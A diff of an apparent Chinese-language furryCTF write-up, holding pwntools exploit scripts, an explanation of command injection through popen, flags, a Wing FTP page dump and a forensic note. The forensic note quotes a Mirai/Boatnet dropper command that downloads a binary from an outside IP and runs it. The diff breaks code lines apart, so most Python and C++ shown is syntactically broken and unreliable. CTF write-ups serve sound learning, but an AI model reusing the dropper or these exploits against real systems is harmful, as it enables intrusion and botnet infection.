@@ -13,7 +13,8 @@ import requests
 import base64
 
 # 根据你的截图修改基础 URL
-base_url = "http://ctf.furryctf.com:32824"
+base_url = "http://ctf.furryctf.com:
+32824"
 chars = []
 
 print("开始爬取 Base16 字符...")
@@ -32,7 +33,8 @@ for i in range(1, 481):
                 print(f"已完成: {i}/480")
         else:
             print(f"第 {i} 页获取失败: {data.get('error')}")
-    except Exception as e:
+    
+except Exception as e:
         print(f"请求异常: {e}")
 
 # 拼接成完整的字符串
@@ -206,7 +208,8 @@ def run_vm(bytecode):
             else:
                 pop_safe()
 
-        except Exception:
+        
+except Exception:
             return 0
 
     return stack[-1] if stack else 0
@@ -216,7 +219,8 @@ def solve():
         try:
             r = remote(HOST, PORT)
             break
-        except:
+        
+except:
             time.sleep(1)
 
     for i in range(1, 101):
@@ -242,10 +246,12 @@ def solve():
                         print(f"n[!] FLAG: {line}")
                         return
                         
-                except Exception:
+                
+except Exception:
                     break
                 
-        except EOFError:
+        
+except EOFError:
             break
             
     r.interactive()
@@ -279,10 +285,12 @@ def solve():
     try:
         with open('Encrypt.py', 'r', encoding='utf-8') as f:
             content = f.read()
-    except UnicodeDecodeError:
+    
+except UnicodeDecodeError:
         with open('Encrypt.py', 'r', encoding='gbk') as f:
             content = f.read()
-    except FileNotFoundError:
+    
+except FileNotFoundError:
         print("[!] File not found.")
         return
 
@@ -304,7 +312,8 @@ def solve():
     try:
         matrix = ast.literal_eval(matrix_str)
         result = ast.literal_eval(result_str)
-    except Exception as e:
+    
+except Exception as e:
         print(f"[!] Parse error: {e}")
         return
 
@@ -558,7 +567,9 @@ post
 
 原理：
 
-程序在 main 函数中处理网络请求。当检测到请求以 “POST ” 开头时，代码逻辑寻找 HTTP 头部的结束标志 rnrn。程序未对后续内容进行任何过滤，直接通过 std::string::substr 截取 rnrn 之后的所有内容（即 HTTP Body），并将其传入 popen() 当作 Shell 命令执行，最后将执行结果回显给用户。
+程序在 main 函数中处理网络请求。当检测到请求以 “POST ” 开头时，代码逻辑寻找 HTTP 头部的结束标志 rnrn。程序未对后续内容进行任何过滤，直接通过 std::
+string::
+substr 截取 rnrn 之后的所有内容（即 HTTP Body），并将其传入 popen() 当作 Shell 命令执行，最后将执行结果回显给用户。
 
 解法：构造一个符合 HTTP 格式的 POST 请求，在头部结束符 rnrn 之后直接写入系统命令 cat /flag。
 
@@ -598,62 +609,118 @@ int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
   *(_WORD *)addr.sa_data = htons(0x1F90u);
   bind(fd, &addr, 0x10u);
   listen(fd, 3);
-  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "Vulnerable POST Web server running on port ");
-  v4 = std::ostream::operator<<(v3, 8080);
-  std::operator<<<std::char_traits<char>>(v4, "...n");
+  v3 = std::
+operator<<<std::
+char_traits<char>>(&std::
+cout, "Vulnerable POST Web server running on port ");
+  v4 = std::
+ostream::
+operator<<(v3, 8080);
+  std::
+operator<<<std::
+char_traits<char>>(v4, "...n");
 while ( 1 )
   {
     v15 = accept(fd, &addr, &addr_len);
     memset(s, 0, 0x1000u);
     read(v15, s, 0xFFFu);
-    v5 = std::operator<<<std::char_traits<char>>(&std::cout, "Request:n");
-    v6 = std::operator<<<std::char_traits<char>>(v5, s);
-    std::ostream::operator<<(v6, &std::endl<char,std::char_traits<char>>);
+    v5 = std::
+operator<<<std::
+char_traits<char>>(&std::
+cout, "Request:n");
+    v6 = std::
+operator<<<std::
+char_traits<char>>(v5, s);
+    std::
+ostream::
+operator<<(v6, &std::
+endl<char,std::
+char_traits<char>>);
     v18 = &v12;
-    std::string::basic_string<std::allocator<char>>(
+    std::
+string::
+basic_string<std::
+allocator<char>>(
       v21,
       "HTTP/1.1 200 OKrnContent-Type: text/htmlrnConnection: closernrn",
       &v12);
-    std::__new_allocator<char>::~__new_allocator(&v12);
+    std::
+__new_allocator<char>::~__new_allocator(&v12);
     v19 = &v12;
-    std::string::basic_string<std::allocator<char>>(v22, s, &v12);
-    std::__new_allocator<char>::~__new_allocator(&v12);
-    if ( std::string::rfind(v22, "POST ", 0) )
+    std::
+string::
+basic_string<std::
+allocator<char>>(v22, s, &v12);
+    std::
+__new_allocator<char>::~__new_allocator(&v12);
+    if ( std::
+string::
+rfind(v22, "POST ", 0) )
     {
-      if ( std::string::rfind(v22, "GET / ", 0) )
-        std::string::operator+=(v21, "Not Foundn");
+      if ( std::
+string::
+rfind(v22, "GET / ", 0) )
+        std::
+string::
+operator+=(v21, "Not Foundn");
       else
-        std::string::operator+=(
+        std::
+string::
+operator+=(
           v21,
-          "<html><body><div style='text-align:center;'><h1>Welcome to the furryctf competition.<br>We hope you will becom"
-          "e a master of webpwn.</h1></div></body></html>n");
+          "<html><h1>Welcome to the furryctf competition.
+We hope you will becom"
+          "e a master of webpwn.</h1></html>n");
     }
     else
     {
-      v16 = std::string::find(v22, "rnrn", 0);
+      v16 = std::
+string::
+find(v22, "rnrn", 0);
       if ( v16 != -1 )
       {
-        std::string::substr(v23, v22, v16 + 4, -1);
-        v7 = std::operator<<<std::char_traits<char>>(&std::cout, "Executing command: ");
-        v8 = std::operator<<<char>(v7, v23);
-        std::ostream::operator<<(v8, &std::endl<char,std::char_traits<char>>);
-        v9 = (const char *)std::string::c_str(v23);
+        std::
+string::
+substr(v23, v22, v16 + 4, -1);
+        v7 = std::
+operator<<<std::
+char_traits<char>>(&std::
+cout, "Executing command: ");
+        v8 = std::
+operator<<<char>(v7, v23);
+        std::
+ostream::
+operator<<(v8, &std::
+endl<char,std::
+char_traits<char>>);
+        v9 = (const char *)std::
+string::
+c_str(v23);
         stream = popen(v9, "r");
         if ( stream )
         {
           while ( fgets(v25, 4096, stream) )
-            std::string::operator+=(v21, v25);
+            std::
+string::
+operator+=(v21, v25);
           pclose(stream);
         }
-        std::string::~string(v23);
+        std::
+string::~string(v23);
       }
     }
-    v10 = std::string::size(v21);
-    v11 = (const void *)std::string::c_str(v21);
+    v10 = std::
+string::
+size(v21);
+    v11 = (const void *)std::
+string::
+c_str(v21);
     write(v15, v11, v10);
     close(v15);
-    std::string::~string(v22);
-    std::string::~string(v21);
+    std::
+string::~string(v22);
+    std::
+string::~string(v21);
   }
 }
 
@@ -686,7 +753,8 @@ def exploit():
 
         io.close()
 
-    except Exception as e:
+    
+except Exception as e:
         print(f"[-] Error: {e}")
 
 if __name__ == '__main__':
@@ -809,7 +877,7 @@ Content-Length: 88
 Connection: close
 Content-Type: application/x-www-form-urlencoded
 
-<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>HTTP/1.0 200 HTTP OK
+<methodCall><methodName>system.listMethods</methodName></methodCall>HTTP/1.0 200 HTTP OK
 Server: Wing FTP Server(Free Edition)
 Cache-Control: no-store
 Content-Type: text/html
@@ -832,40 +900,10 @@ Connection: close
 <link rel="Shortcut Icon" href="images/logo.ico" type="image/x-icon">
 <link rel="stylesheet" href="css/bulma.min.css" type="text/css">
 <link rel="stylesheet" href="css/allfonts.min.css" type="text/css">
-<style type="text/css">
- img { 
-float:left; margin-right:10px; margin-top:-22px;
- } 
-input:focus,select:focus {
-border:0px;
- }
-.main {
-width:480px; margin:0 auto; margin-top:100px;
- }
 
-.hiddenimg {
-margin:5px;
-display:none;
- }
-
-@mediaonly screen and (max-width:1023px), only screen and (max-device-width:1023px) {
-.main {
-   width:380px; margin:0 auto; margin-top:60px;
-  }
- }
-</style>
 
 <!--[if lt IE 9]>
-  <style type="text/css">
- .input:active,.input:focus,.select select:active,.select select:focus {
-  border:solid 1px #CCC;
- }
-
- .hiddenimg {
-  margin:5px;
-  display:block;
- }
-  </style>
+  
 <![endif]-->
 
 <script language="javascript">
@@ -986,79 +1024,79 @@ else
 </script>
 
 </head>
-<body>
 
-<div class="main">
+
+
 
 <form class="box" method="post" action="loginok.html">
-<input name="username" id="username" type="hidden">
-<input name="password" id="password" type="hidden">
 
-<div class="field">
-<p class="subtitle is-4" style="color:#CCC; margin-top:22px;"><img src="images/logo.png?t=1754903353">Web Client</p>
-</div>
 
-<div class="field" style="margin-top:50px">
-<p class="control has-icons-left">
-    <input class="input" name="username_val" id="username_val" type="text" autocomplete="new-password" maxlength="128" value="" placeholder="Account:">
-    <span class="icon is-small is-left">
-   <img src="images/input_user.png" class="hiddenimg" title="Account:">
-      <i class="fas fa-user"></i>
-    </span>
-</p>
-</div>
-<div class="field" style="margin-top:5px">
-<p class="control has-icons-left">
-    <input class="input" name="password_val" id="password_val" type="password" autocomplete="off" maxlength="128" placeholder="Password:">
-    <span class="icon is-small is-left">
-   <img src="images/input_pass.png" class="hiddenimg" title="Password:">
-      <i class="fas fa-lock"></i>
-    </span>
-</p>
-</div>
 
-<div class="field" style="margin-top:5px">
-<div class="control has-icons-left">
-<div class="select is-fullwidth">
+
+Web Client
+
+
+
+
+    
+    
+   
+      
+    
+
+
+
+
+    
+    
+   
+      
+    
+
+
+
+
+
+
     <select id="lang_sel" onchange="changelanguage(this)">
     </select>
-</div>
-<span class="icon is-small is-left">
-    <img src="images/select_lang.png" class="hiddenimg" title="Language:">
-    <i class="fas fa-globe"></i>
-</span>
-</div>
-</div>
 
-<div class="level" style="margin-top:5px">
-<div class="level-left" style="float:left;">
-<input type="checkbox" name="remember" id="remember" value="true"  onclick="switchcheckbox()" style="margin-right:5px;">Remember me
-</div>
-<div class="level-right" style="float:right; margin:5px;">
-<p style="font-size:9pt; cursor:pointer; min-width:80px;" onclick="showQRcode();"><img src="images/phone.png" style="margin-right:3px; margin-top:1px;">Download App</p>
-<p><a href="https://wftpserver.com/download_client.html" target="_blank"><img src="images/qrcode.png" id="qrcode" border="0" style="display:none; margin-top:1px; margin-bottom:10px; margin-left:18px;" title="Scan or click the QR code to download"></a></p>
-</div>
-</div>
 
-<div class="control" style="padding-top:20px">
-<button class="button is-info is-fullwidth" onclick="return ch()">
-<span class="icon">
-<i class="fas fa-sign-in-alt"></i>
-</span>
-<span> Login </span>
-</button>
-</div>
+    
+    
+
+
+
+
+
+
+Remember me
+
+
+Download App
+[](https://wftpserver.com/download_client.html)
+
+
+
+
+
+
+
+
+ Login 
+
+
 
 </form>
 
-<div style="text-align:center; margin-top:30px; font-size:10pt;">
 
-   FTP server software powered by <b><a href="https://www.wftpserver.com/">Wing FTP Server v7.4.4</a></b>
 
-</div>
+   FTP server software powered by [Wing FTP Server v7.4.4](https://www.wftpserver.com/)
 
-</div>
-</body>
+
+
+
+
 </html>
 
 <script language="javascript">
@@ -1076,7 +1114,8 @@ $("username_val").focus();
 
 </script>
 
-<noscript><center><H2>The web client requires that you have Javascript enabled on your browser.<br>If you're not sure how to do this, <a href='help_javascript.htm'>click here.</a></H2></center></noscript>
+<noscript><H2>The web client requires that you have Javascript enabled on your browser.
+If you're not sure how to do this, <a href='help_javascript.htm'>click here.</a></H2></noscript>
 
 关键发现
 
@@ -1100,7 +1139,8 @@ import requests
 import base64
 
 # 根据你的截图修改基础 URL
-base_url = "http://ctf.furryctf.com:32824"
+base_url = "http://ctf.furryctf.com:
+32824"
 chars = []
 
 print("开始爬取 Base16 字符...")
@@ -1119,7 +1159,8 @@ for i in range(1, 481):
                 print(f"已完成: {i}/480")
         else:
             print(f"第 {i} 页获取失败: {data.get('error')}")
-    except Exception as e:
+    
+except Exception as e:
         print(f"请求异常: {e}")
 
 # 拼接成完整的字符串
@@ -1137,17 +1178,7 @@ try:
     print(final_flag.decode())
 except Exception as e:
     print(f"n[-] 解码失败，请检查数据完整性: {e}")
-```
-
-
-
-```
 furryCTF{21ec42bf-d921-4b81-9be2-c4160c68c2cc-79e5103e-81d1-49f7-b94f-0d2b719307a9-dccb8de2-2cb9-45a4-906a-7b6be4fcbfbf}
-```
-
-
-
-```
 from pwn import *
 import ctypes
 import time
@@ -1253,7 +1284,8 @@ def run_vm(bytecode):
             else:
                 pop_safe()
 
-        except Exception:
+        
+except Exception:
             return 0
 
     return stack[-1] if stack else 0
@@ -1263,7 +1295,8 @@ def solve():
         try:
             r = remote(HOST, PORT)
             break
-        except:
+        
+except:
             time.sleep(1)
 
     for i in range(1, 101):
@@ -1289,27 +1322,19 @@ def solve():
                         print(f"n[!] FLAG: {line}")
                         return
                         
-                except Exception:
+                
+except Exception:
                     break
                 
-        except EOFError:
+        
+except EOFError:
             break
             
     r.interactive()
 
 if __name__ == '__main__':
     solve()
-```
-
-
-
-```
 POFP{7ea6031a-5213-403c-8f39-e06d2b19c4e6}
-```
-
-
-
-```
 import ast
 import sys
 
@@ -1320,10 +1345,12 @@ def solve():
     try:
         with open('Encrypt.py', 'r', encoding='utf-8') as f:
             content = f.read()
-    except UnicodeDecodeError:
+    
+except UnicodeDecodeError:
         with open('Encrypt.py', 'r', encoding='gbk') as f:
             content = f.read()
-    except FileNotFoundError:
+    
+except FileNotFoundError:
         print("[!] File not found.")
         return
 
@@ -1345,7 +1372,8 @@ def solve():
     try:
         matrix = ast.literal_eval(matrix_str)
         result = ast.literal_eval(result_str)
-    except Exception as e:
+    
+except Exception as e:
         print(f"[!] Parse error: {e}")
         return
 
@@ -1444,25 +1472,10 @@ def find_paths(bits, char_map, current_path, results):
 
 if __name__ == '__main__':
     solve()
-```
-
-
-
-```
 furryCTF{Xa2_Matrc8_Wi7h_On9_Unis5e_SaYk41on}
-```
-
-
-
-```
 mov rax, r14
 mov rdx, r15
 retn
-```
-
-
-
-```
 from pwn import *
 
 context.arch = 'amd64'
@@ -1510,17 +1523,7 @@ io.sendline(payload)
 io.sendline(b'/bin/shx00')
 
 io.interactive()
-```
-
-
-
-```
 furryCTF{5bbac3076208_WElC0me_7o_pWn_574cK_Sy57eM_Nwn}
-```
-
-
-
-```
 from pwn import *
 import time
 
@@ -1566,17 +1569,7 @@ io.send(b'env >&2; exitn')
 
 print(io.recvall().decode(errors='ignore'))
 io.close()
-```
-
-
-
-```
 POFP{892358e7-e400-44e7-8095-6d6e46c09523}
-```
-
-
-
-```
 int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
 {
   __int64 v3; // rax
@@ -1613,69 +1606,120 @@ int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
   *(_WORD *)addr.sa_data = htons(0x1F90u);
   bind(fd, &addr, 0x10u);
   listen(fd, 3);
-  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "Vulnerable POST Web server running on port ");
-  v4 = std::ostream::operator<<(v3, 8080);
-  std::operator<<<std::char_traits<char>>(v4, "...n");
+  v3 = std::
+operator<<<std::
+char_traits<char>>(&std::
+cout, "Vulnerable POST Web server running on port ");
+  v4 = std::
+ostream::
+operator<<(v3, 8080);
+  std::
+operator<<<std::
+char_traits<char>>(v4, "...n");
 while ( 1 )
   {
     v15 = accept(fd, &addr, &addr_len);
     memset(s, 0, 0x1000u);
     read(v15, s, 0xFFFu);
-    v5 = std::operator<<<std::char_traits<char>>(&std::cout, "Request:n");
-    v6 = std::operator<<<std::char_traits<char>>(v5, s);
-    std::ostream::operator<<(v6, &std::endl<char,std::char_traits<char>>);
+    v5 = std::
+operator<<<std::
+char_traits<char>>(&std::
+cout, "Request:n");
+    v6 = std::
+operator<<<std::
+char_traits<char>>(v5, s);
+    std::
+ostream::
+operator<<(v6, &std::
+endl<char,std::
+char_traits<char>>);
     v18 = &v12;
-    std::string::basic_string<std::allocator<char>>(
+    std::
+string::
+basic_string<std::
+allocator<char>>(
       v21,
       "HTTP/1.1 200 OKrnContent-Type: text/htmlrnConnection: closernrn",
       &v12);
-    std::__new_allocator<char>::~__new_allocator(&v12);
+    std::
+__new_allocator<char>::~__new_allocator(&v12);
     v19 = &v12;
-    std::string::basic_string<std::allocator<char>>(v22, s, &v12);
-    std::__new_allocator<char>::~__new_allocator(&v12);
-    if ( std::string::rfind(v22, "POST ", 0) )
+    std::
+string::
+basic_string<std::
+allocator<char>>(v22, s, &v12);
+    std::
+__new_allocator<char>::~__new_allocator(&v12);
+    if ( std::
+string::
+rfind(v22, "POST ", 0) )
     {
-      if ( std::string::rfind(v22, "GET / ", 0) )
-        std::string::operator+=(v21, "Not Foundn");
+      if ( std::
+string::
+rfind(v22, "GET / ", 0) )
+        std::
+string::
+operator+=(v21, "Not Foundn");
       else
-        std::string::operator+=(
+        std::
+string::
+operator+=(
           v21,
-          "<html><body><div style='text-align:center;'><h1>Welcome to the furryctf competition.<br>We hope you will becom"
-          "e a master of webpwn.</h1></div></body></html>n");
+          "<html><h1>Welcome to the furryctf competition.
+We hope you will becom"
+          "e a master of webpwn.</h1></html>n");
     }
     else
     {
-      v16 = std::string::find(v22, "rnrn", 0);
+      v16 = std::
+string::
+find(v22, "rnrn", 0);
       if ( v16 != -1 )
       {
-        std::string::substr(v23, v22, v16 + 4, -1);
-        v7 = std::operator<<<std::char_traits<char>>(&std::cout, "Executing command: ");
-        v8 = std::operator<<<char>(v7, v23);
-        std::ostream::operator<<(v8, &std::endl<char,std::char_traits<char>>);
-        v9 = (const char *)std::string::c_str(v23);
+        std::
+string::
+substr(v23, v22, v16 + 4, -1);
+        v7 = std::
+operator<<<std::
+char_traits<char>>(&std::
+cout, "Executing command: ");
+        v8 = std::
+operator<<<char>(v7, v23);
+        std::
+ostream::
+operator<<(v8, &std::
+endl<char,std::
+char_traits<char>>);
+        v9 = (const char *)std::
+string::
+c_str(v23);
         stream = popen(v9, "r");
         if ( stream )
         {
           while ( fgets(v25, 4096, stream) )
-            std::string::operator+=(v21, v25);
+            std::
+string::
+operator+=(v21, v25);
           pclose(stream);
         }
-        std::string::~string(v23);
+        std::
+string::~string(v23);
       }
     }
-    v10 = std::string::size(v21);
-    v11 = (const void *)std::string::c_str(v21);
+    v10 = std::
+string::
+size(v21);
+    v11 = (const void *)std::
+string::
+c_str(v21);
     write(v15, v11, v10);
     close(v15);
-    std::string::~string(v22);
-    std::string::~string(v21);
+    std::
+string::~string(v22);
+    std::
+string::~string(v21);
   }
 }
-```
-
-
-
-```
 from pwn import *
 
 HOST = 'ctf.furryctf.com'
@@ -1703,22 +1747,13 @@ def exploit():
 
         io.close()
 
-    except Exception as e:
+    
+except Exception as e:
         print(f"[-] Error: {e}")
 
 if __name__ == '__main__':
     exploit()
-```
-
-
-
-```
 POFP{b1c31c33-eb7c-4947-aca3-8ec6087e6758}
-```
-
-
-
-```
 from pwn import *
 
 context.log_level = 'debug'
@@ -1774,17 +1809,7 @@ payload2 = flat([
 io.sendline(payload2)
 io.sendline(b'cat flag')
 io.interactive()
-```
-
-
-
-```
 POFP{ef038613-5328-4598-a2b1-85c364de24e1}
-```
-
-
-
-```
 POST / HTTP/1.1
 Host: 192.168.136.1
 User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
@@ -1792,7 +1817,7 @@ Content-Length: 88
 Connection: close
 Content-Type: application/x-www-form-urlencoded
 
-<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>HTTP/1.0 200 HTTP OK
+<methodCall><methodName>system.listMethods</methodName></methodCall>HTTP/1.0 200 HTTP OK
 Server: Wing FTP Server(Free Edition)
 Cache-Control: no-store
 Content-Type: text/html
@@ -1815,40 +1840,10 @@ Connection: close
 <link rel="Shortcut Icon" href="images/logo.ico" type="image/x-icon">
 <link rel="stylesheet" href="css/bulma.min.css" type="text/css">
 <link rel="stylesheet" href="css/allfonts.min.css" type="text/css">
-<style type="text/css">
- img { 
-float:left; margin-right:10px; margin-top:-22px;
- } 
-input:focus,select:focus {
-border:0px;
- }
-.main {
-width:480px; margin:0 auto; margin-top:100px;
- }
 
-.hiddenimg {
-margin:5px;
-display:none;
- }
-
-@mediaonly screen and (max-width:1023px), only screen and (max-device-width:1023px) {
-.main {
-   width:380px; margin:0 auto; margin-top:60px;
-  }
- }
-</style>
 
 <!--[if lt IE 9]>
-  <style type="text/css">
- .input:active,.input:focus,.select select:active,.select select:focus {
-  border:solid 1px #CCC;
- }
-
- .hiddenimg {
-  margin:5px;
-  display:block;
- }
-  </style>
+  
 <![endif]-->
 
 <script language="javascript">
@@ -1969,79 +1964,79 @@ else
 </script>
 
 </head>
-<body>
 
-<div class="main">
+
+
 
 <form class="box" method="post" action="loginok.html">
-<input name="username" id="username" type="hidden">
-<input name="password" id="password" type="hidden">
 
-<div class="field">
-<p class="subtitle is-4" style="color:#CCC; margin-top:22px;"><img src="images/logo.png?t=1754903353">Web Client</p>
-</div>
 
-<div class="field" style="margin-top:50px">
-<p class="control has-icons-left">
-    <input class="input" name="username_val" id="username_val" type="text" autocomplete="new-password" maxlength="128" value="" placeholder="Account:">
-    <span class="icon is-small is-left">
-   <img src="images/input_user.png" class="hiddenimg" title="Account:">
-      <i class="fas fa-user"></i>
-    </span>
-</p>
-</div>
-<div class="field" style="margin-top:5px">
-<p class="control has-icons-left">
-    <input class="input" name="password_val" id="password_val" type="password" autocomplete="off" maxlength="128" placeholder="Password:">
-    <span class="icon is-small is-left">
-   <img src="images/input_pass.png" class="hiddenimg" title="Password:">
-      <i class="fas fa-lock"></i>
-    </span>
-</p>
-</div>
 
-<div class="field" style="margin-top:5px">
-<div class="control has-icons-left">
-<div class="select is-fullwidth">
+
+Web Client
+
+
+
+
+    
+    
+   
+      
+    
+
+
+
+
+    
+    
+   
+      
+    
+
+
+
+
+
+
     <select id="lang_sel" onchange="changelanguage(this)">
     </select>
-</div>
-<span class="icon is-small is-left">
-    <img src="images/select_lang.png" class="hiddenimg" title="Language:">
-    <i class="fas fa-globe"></i>
-</span>
-</div>
-</div>
 
-<div class="level" style="margin-top:5px">
-<div class="level-left" style="float:left;">
-<input type="checkbox" name="remember" id="remember" value="true"  onclick="switchcheckbox()" style="margin-right:5px;">Remember me
-</div>
-<div class="level-right" style="float:right; margin:5px;">
-<p style="font-size:9pt; cursor:pointer; min-width:80px;" onclick="showQRcode();"><img src="images/phone.png" style="margin-right:3px; margin-top:1px;">Download App</p>
-<p><a href="https://wftpserver.com/download_client.html" target="_blank"><img src="images/qrcode.png" id="qrcode" border="0" style="display:none; margin-top:1px; margin-bottom:10px; margin-left:18px;" title="Scan or click the QR code to download"></a></p>
-</div>
-</div>
 
-<div class="control" style="padding-top:20px">
-<button class="button is-info is-fullwidth" onclick="return ch()">
-<span class="icon">
-<i class="fas fa-sign-in-alt"></i>
-</span>
-<span> Login </span>
-</button>
-</div>
+    
+    
+
+
+
+
+
+
+Remember me
+
+
+Download App
+[](https://wftpserver.com/download_client.html)
+
+
+
+
+
+
+
+
+ Login 
+
+
 
 </form>
 
-<div style="text-align:center; margin-top:30px; font-size:10pt;">
 
-   FTP server software powered by <b><a href="https://www.wftpserver.com/">Wing FTP Server v7.4.4</a></b>
 
-</div>
+   FTP server software powered by [Wing FTP Server v7.4.4](https://www.wftpserver.com/)
 
-</div>
-</body>
+
+
+
+
 </html>
 
 <script language="javascript">
@@ -2059,30 +2054,11 @@ $("username_val").focus();
 
 </script>
 
-<noscript><center><H2>The web client requires that you have Javascript enabled on your browser.<br>If you're not sure how to do this, <a href='help_javascript.htm'>click here.</a></H2></center></noscript>
-```
-
-
-
-```
+<noscript><H2>The web client requires that you have Javascript enabled on your browser.
+If you're not sure how to do this, <a href='help_javascript.htm'>click here.</a></H2></noscript>
 ZnVycnlDVEZ7RnIwbV9Bbm9uOW0wdXNfVG9fUm8wdH0=
-```
-
-
-
-```
 furryCTF{Fr0m_Anon9m0us_To_Ro0t}
-```
-
-
-
-```
 POFP{0xFF7C350e70879D04A13bb2d8D77B60e603b7DB72}
-```
-
-
-
-```
 1. 真正的攻击者与漏洞 
 攻击特征: 针对 TBK DVR (数字视频录像机) 设备的远程命令执行 (RCE) 漏洞。
 
@@ -2097,11 +2073,6 @@ CVE 编号: CVE-2024-3721 (或者关联的旧编号 CVE-2018-9995，但 opt=sys
 攻击者 IP: 144.172.98.50
 
 攻击载荷 (Payload): cd /tmp;rm boatnet.arm7; wget http://103.77.241.165/hiddenbin/boatnet.arm7; chmod 777 *; ./boatnet.arm7 tbk 这是典型的 Mirai / Boatnet 僵尸网络植入行为。
-```
-
-
-
-```
 furryCTF{CVE-2024-3721}
 ```
 
